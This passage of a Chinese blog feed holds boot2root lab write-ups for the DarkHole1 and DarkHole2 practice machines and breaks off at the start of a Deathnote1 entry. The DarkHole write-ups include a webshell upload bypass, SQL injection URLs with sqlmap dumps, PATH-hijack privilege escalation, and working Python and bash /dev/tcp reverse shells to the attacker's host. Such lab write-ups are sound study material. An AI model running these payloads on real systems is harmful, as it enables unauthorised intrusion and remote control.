[Size: 2507]</span><br><span class="line">/register.php         (Status: 200) [Size: 2886]</span><br><span class="line">/index.php            (Status: 200) [Size: 810] </span><br><span class="line">/upload               (Status: 301) [Size: 315] [--&gt; http://192.168.1.120/upload/]</span><br><span class="line">/css                  (Status: 301) [Size: 312] [--&gt; http://192.168.1.120/css/]   </span><br><span class="line">/js                   (Status: 301) [Size: 311] [--&gt; http://192.168.1.120/js/]    </span><br><span class="line">/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]                     </span><br><span class="line">/config               (Status: 301) [Size: 315] [--&gt; http://192.168.1.120/config/]</span><br><span class="line">/dashboard.php        (Status: 200) [Size: 21]                                    </span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                   </span><br><span class="line">                                                                                  </span><br><span class="line">===============================================================</span><br><span class="line">2021/09/09 19:14:46 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./DarkHole1/1.png" alt></p>
<h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h3><ul>
<li>注册账户<code>weiyi@qq.com / 123456</code></li>
<li>登录，修改密码项发现逻辑问题</li>
</ul>
<p><img data-src="./DarkHole1/2.png" alt></p>
<p><img data-src="./DarkHole1/3.png" alt></p>
<ul>
<li>成功将<code>admin</code>密码修改为<code>123456</code></li>
</ul>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><ul>
<li>登录<code>admin</code>用户，发现文件上传接口</li>
</ul>
<p><img data-src="./DarkHole1/4.png" alt></p>
<ul>
<li>会限制<code>php</code>文件后缀，使用<code>phtml</code>绕过即可</li>
<li>获得<code>webshell</code></li>
</ul>
<p><img data-src="./DarkHole1/5.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li>环境变量提权</li>
</ul>
<p><img data-src="./DarkHole1/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo $PATH</span><br><span class="line">cp /usr/bin/bash ./id</span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到<code>john</code></li>
</ul>
<p><img data-src="./DarkHole1/7.png" alt></p>
<ul>
<li>查看密码</li>
</ul>
<p><img data-src="./DarkHole1/8.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh john@192.168.1.152</span><br><span class="line">root123</span><br></pre></td></tr></table></figure>

<p><img data-src="./DarkHole1/9.png" alt></p>
<ul>
<li><code>file.py</code>反弹<code>shell</code>拿<code>root</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"192.168.1.102"</span>,<span class="number">7776</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">"sh"</span>)</span><br></pre></td></tr></table></figure>

<p><img data-src="./DarkHole1/10.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>DarkHole</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>DarkHole</tag>
      </tags>
  </entry>
  <entry>
    <title>DarkHole2</title>
    <url>/2021/09/12/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/DarkHole2/</url>
    <content><![CDATA[<h1 id="DarkHole2"><a href="#DarkHole2" class="headerlink" title="DarkHole2"></a>DarkHole2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>DarkHole2</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\DarkHole1&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.102</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.137   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.152   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.242   3c:7c:3f:d3:05:d5       (Unknown)</span><br><span class="line"></span><br><span class="line">10 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.968 seconds (130.08 hosts/sec). 10 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.137</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.137</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\DarkHole2&gt; nmap -sV -A -p 1-65535 192.168.1.137</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-12 13:55 EDT</span><br><span class="line">Nmap scan report for darkhole.lan (192.168.1.137)</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)</span><br><span class="line">|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)</span><br><span class="line">|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-git: </span><br><span class="line">|   192.168.1.137:80/.git/</span><br><span class="line">|     Git repository found!</span><br><span class="line">|     Repository description: Unnamed repository; edit this file 'description' to name the...</span><br><span class="line">|_    Last commit message: i changed login.php file for more secure </span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: DarkHole V2</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.18 ms darkhole.lan (192.168.1.137)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.137/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">C:\root\vulnhub\DarkHole2&gt; gobuster dir -u http://192.168.1.137/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php                                                             130 ⨯</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.137/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              php,html,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/09/12 13:57:11 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 200) [Size: 740]</span><br><span class="line">/login.php            (Status: 200) [Size: 1026]</span><br><span class="line">/style                (Status: 301) [Size: 314] [--&gt; http://192.168.1.137/style/]</span><br><span class="line">/js                   (Status: 301) [Size: 311] [--&gt; http://192.168.1.137/js/]   </span><br><span class="line">/logout.php           (Status: 302) [Size: 0] [--&gt; index.php]                    </span><br><span class="line">/config               (Status: 301) [Size: 315] [--&gt; http://192.168.1.137/config/]</span><br><span class="line">/dashboard.php        (Status: 200) [Size: 11]                                    </span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                   </span><br><span class="line">                                                                                  </span><br><span class="line">===============================================================</span><br><span class="line">2021/09/12 13:59:44 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./DarkHole2/1.png" alt></p>
<h3 id="git文件泄漏"><a href="#git文件泄漏" class="headerlink" title=".git文件泄漏"></a>.git文件泄漏</h3><ul>
<li><code>git-dumper</code>拉取网站源码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git-dumper http://192.168.1.137:80/.git/ ./website</span><br></pre></td></tr></table></figure>

<ul>
<li>审计发现如下代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span> <span class="string">'config/config.php'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span>)&#123;</span><br><span class="line">    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST[<span class="string">'email'</span>]));</span><br><span class="line">    $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST[<span class="string">'password'</span>]));</span><br><span class="line">    $check = $connect-&gt;query(<span class="string">"select * from users where email='$email' and password='$pass' and id=1"</span>);</span><br><span class="line">    <span class="keyword">if</span>($check-&gt;num_rows)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'userid'</span>] = <span class="number">1</span>;</span><br><span class="line">        header(<span class="string">"location:dashboard.php"</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>存在<code>sql</code>注入问题（失败）</p>
</li>
<li><p><code>git log</code></p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\root\vulnhub\DarkHole2\website&gt; git log                                                                                                                                         1 ⨯</span><br><span class="line">commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -&gt; master)</span><br><span class="line">Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;</span><br><span class="line">Date:   Mon Aug 30 13:14:32 2021 +0300</span><br><span class="line"></span><br><span class="line">    i changed login.php file for more secure</span><br><span class="line"></span><br><span class="line">commit a4d900a8d85e8938d3601f3cef113ee293028e10</span><br><span class="line">Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;</span><br><span class="line">Date:   Mon Aug 30 13:06:20 2021 +0300</span><br><span class="line"></span><br><span class="line">    I added login.php file with default credentials</span><br><span class="line"></span><br><span class="line">commit aa2a5f3aa15bb402f2b90a07d86af57436d64917</span><br><span class="line">Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;</span><br><span class="line">Date:   Mon Aug 30 13:02:44 2021 +0300</span><br><span class="line"></span><br><span class="line">    First Initialize</span><br></pre></td></tr></table></figure>

<ul>
<li>发现敏感信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\root\vulnhub\DarkHole2\website&gt; git checkout a4d9                                                                                                                               1 ⨯</span><br><span class="line">Note: switching to 'a4d9'.</span><br><span class="line"></span><br><span class="line">You are in 'detached HEAD' state. You can look around, make experimental</span><br><span class="line">changes and commit them, and you can discard any commits you make in this</span><br><span class="line">state without impacting any branches by switching back to a branch.</span><br><span class="line"></span><br><span class="line">If you want to create a new branch to retain commits you create, you may</span><br><span class="line">do so (now or later) by using -c with the switch command. Example:</span><br><span class="line"></span><br><span class="line">  git switch -c &lt;new-branch-name&gt;</span><br><span class="line"></span><br><span class="line">Or undo this operation with:</span><br><span class="line"></span><br><span class="line">  git switch -</span><br><span class="line"></span><br><span class="line">Turn off this advice by setting config variable advice.detachedHead to false</span><br><span class="line"></span><br><span class="line">HEAD is now at a4d900a I added login.php file with default credentials</span><br><span class="line"></span><br><span class="line">===============</span><br><span class="line">cat login.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">require 'config/config.php';</span><br><span class="line"><span class="meta">if($</span><span class="bash">_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span>)&#123;</span></span><br><span class="line">    if($_POST['email'] == "lush@admin.com" &amp;&amp; $_POST['password'] == "321")&#123;</span><br><span class="line">        $_SESSION['userid'] = 1;</span><br><span class="line">        header("location:dashboard.php");</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>获得账号密码 <code>lush@admin.com \ 321</code></li>
</ul>
<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><ul>
<li>登录发现<code>id</code>存在<code>sql</code>注入</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.137/dashboard.php?id=1%27%20and%201=1%20order%20by%206--+</span><br></pre></td></tr></table></figure>

<ul>
<li>存在<code>6</code>个字段</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.137/dashboard.php?id=1%27%20%20and%201=2%20union%20select%201,2,3,4,5,6%20--+</span><br></pre></td></tr></table></figure>

<ul>
<li>回显点 <code>2 3 5 6</code></li>
</ul>
<p><img data-src="./DarkHole2/2.png" alt></p>
<ul>
<li><code>sqlmap</code>冲</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -r 2.txt --level 3 --risk 3 --data "id=1"</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">...</span><br><span class="line">[19:59:20] [INFO] checking if the injection point on GET parameter 'id' is a false positive</span><br><span class="line">GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] </span><br><span class="line">sqlmap identified the following injection point(s) with a total of 1442 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1' AND (SELECT 8969 FROM (SELECT(SLEEP(5)))Mbst)-- nMcY</span><br><span class="line">---</span><br><span class="line">[20:02:57] [INFO] the back-end DBMS is MySQL</span><br><span class="line">[20:02:57] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions </span><br><span class="line">[20:02:57] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)</span><br><span class="line">web server operating system: Linux Ubuntu 19.10 or 20.04 (focal or eoan)</span><br><span class="line">web application technology: Apache 2.4.41</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[20:02:57] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 630 times</span><br><span class="line">[20:02:57] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.1.137'</span><br><span class="line"></span><br><span class="line">[*] ending @ 20:02:57 /2021-09-21/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -r 2.txt --level 3 --risk 3 --data "id=1" --dbs </span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">available databases [5]:</span><br><span class="line">[*] darkhole_2</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -r 2.txt --level 3 --risk 3 --data "id=1" -D darkhole_2 --dump-all --batch</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Database: darkhole_2</span><br><span class="line">Table: users</span><br><span class="line">[1 entry]</span><br><span class="line">+----+----------------+-------------------------------------------+----------+---------------------------------------------------------------------------------------+----------------+</span><br><span class="line">| id | email          | address                                   | password | username                                                                              | contact_number |</span><br><span class="line">+----+----------------+-------------------------------------------+----------+---------------------------------------------------------------------------------------+----------------+</span><br><span class="line">| 1  | lush@admin.com |  Street, Pincode, Province/State, Country | 321      | Jehad Alqurashiasddasdasdas&amp;quot;;IF(7234=5594) SELECT 7234 ELSE DROP FUNCTION VQCd-- | 1              |</span><br><span class="line">+----+----------------+-------------------------------------------+----------+---------------------------------------------------------------------------------------+----------------+</span><br><span class="line"></span><br><span class="line">[20:22:39] [INFO] table 'darkhole_2.users' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.1.137/dump/darkhole_2/users.csv'</span><br><span class="line">[20:22:39] [INFO] fetching columns for table 'ssh' in database 'darkhole_2'</span><br><span class="line">[20:22:39] [INFO] retrieved: 3</span><br><span class="line">[20:22:42] [INFO] retrieved: id</span><br><span class="line">[20:22:49] [INFO] retrieved: user</span><br><span class="line">[20:23:02] [INFO] retrieved: pass</span><br><span class="line">[20:23:16] [INFO] fetching entries for table 'ssh' in database 'darkhole_2'</span><br><span class="line">[20:23:16] [INFO] fetching number of entries for table 'ssh' in database 'darkhole_2'</span><br><span class="line">[20:23:16] [INFO] retrieved: 1</span><br><span class="line">[20:23:17] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                               </span><br><span class="line">jehad</span><br><span class="line">[20:23:34] [INFO] retrieved: 1</span><br><span class="line">[20:23:36] [INFO] retrieved: fool</span><br><span class="line">Database: darkhole_2</span><br><span class="line">Table: ssh</span><br><span class="line">[1 entry]</span><br><span class="line">+----+------+--------+</span><br><span class="line">| id | pass | user   |</span><br><span class="line">+----+------+--------+</span><br><span class="line">| 1  | fool | jehad  |</span><br><span class="line">+----+------+--------+</span><br></pre></td></tr></table></figure>

<h3 id="发现ssh-jehad-fool"><a href="#发现ssh-jehad-fool" class="headerlink" title="发现ssh jehad / fool"></a>发现ssh <code>jehad / fool</code></h3><p><img data-src="./DarkHole2/3.png" alt></p>
<ul>
<li>切换到  <code>losy</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jehad@darkhole:/$ cat /etc/crontab </span><br><span class="line"><span class="meta">#</span><span class="bash"> /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Unlike any other crontab you don<span class="string">'t have to run the `crontab'</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">command</span> to install the new version when you edit this file</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and files <span class="keyword">in</span> /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> that none of the other crontabs <span class="keyword">do</span>.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Example of job definition:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  |  |  |</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> *  *  *  *  * user-name <span class="built_in">command</span> to be executed</span></span><br><span class="line">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line">* * * * * root service apache2 start &amp;&amp; service mysql start</span><br><span class="line">* * * * * losy  cd /opt/web &amp;&amp; php -S localhost:9999</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查看<code>/opt/web/index.php</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /opt/web/index.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">jehad@darkhole:/$ cat /opt/web/index.php</span><br><span class="line">&lt;?php</span><br><span class="line">echo "Parameter GET['cmd']";</span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_GET[<span class="string">'cmd'</span>]))&#123;</span></span><br><span class="line">echo system($_GET['cmd']);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>ssh</code>端口转发</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -L 9999:127.0.0.1:9999 jehad@192.168.1.137</span><br></pre></td></tr></table></figure>

<p><img data-src="./DarkHole2/4.png" alt></p>
<ul>
<li>拿到<code>losy - shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c  'bash -i &gt;&amp; /dev/tcp/192.168.1.102/7777 0&gt;&amp;1'</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; url</span></span><br><span class="line"><span class="meta">%</span><span class="bash">62%61%73%68%20%2d%63%20%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%31%30%32%2f%37%37%37%37%20%30%3e%26%31%27</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./DarkHole2/5.png" alt></p>
<h3 id="提权-amp-amp-flag"><a href="#提权-amp-amp-flag" class="headerlink" title="提权&amp;&amp;flag"></a>提权&amp;&amp;flag</h3><ul>
<li>查看历史记录</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">id</span><br><span class="line">clear</span><br><span class="line">ls -al</span><br><span class="line">cd home</span><br><span class="line">cd /home</span><br><span class="line">ls</span><br><span class="line">clear</span><br><span class="line">cd jehad/</span><br><span class="line">ls -la</span><br><span class="line">cd ..</span><br><span class="line">cd losy/</span><br><span class="line">cat .bash_history </span><br><span class="line">clear</span><br><span class="line">ls -la</span><br><span class="line">ss</span><br><span class="line">cat .bash_history </span><br><span class="line">clear</span><br><span class="line">password:gang</span><br></pre></td></tr></table></figure>

<ul>
<li>查看<code>sudo -l</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">losy@darkhole:/home$ sudo -l</span><br><span class="line">[sudo] password for losy: </span><br><span class="line">Matching Defaults entries for losy on darkhole:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User losy may run the following commands on darkhole:</span><br><span class="line">    (root) /usr/bin/python3</span><br></pre></td></tr></table></figure>

<ul>
<li>最终拿到<code>flag</code></li>
</ul>
<p><img data-src="./DarkHole2/6.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>DarkHole</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>DarkHole</tag>
      </tags>
  </entry>
  <entry>
    <title>Deathnote1</title>
    <url>/2021/09/11/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Deathnote/</url>
    <content><![CDATA[<h1 id="Deathnote1"><a href="#Deathnote1" class="headerlink" title="Deathnote1"></a>Deathnote1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2021</li>
<li>Deathnote1</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.102</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.111   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.1.190   32:f9:e9:ee:d8:ba       (Unknown: locally administered)</span><br><span class="line">192.168.1.191   88:b1:11:0d:56:74       Intel Corporate</span><br><span class="line">192.168.1.163   a4:50:46:78:16:9f       Xiaomi Communications Co Ltd</span><br><span class="line">192.168.1.242   3c:7c:3f:d3:05:d5       (Unknown)</span><br><span class="line"></span><br><span class="line">11 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.020 seconds (126.73 hosts/sec). 11 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.157</code></li>
<li><code>NMAP</code></li>
</ul>
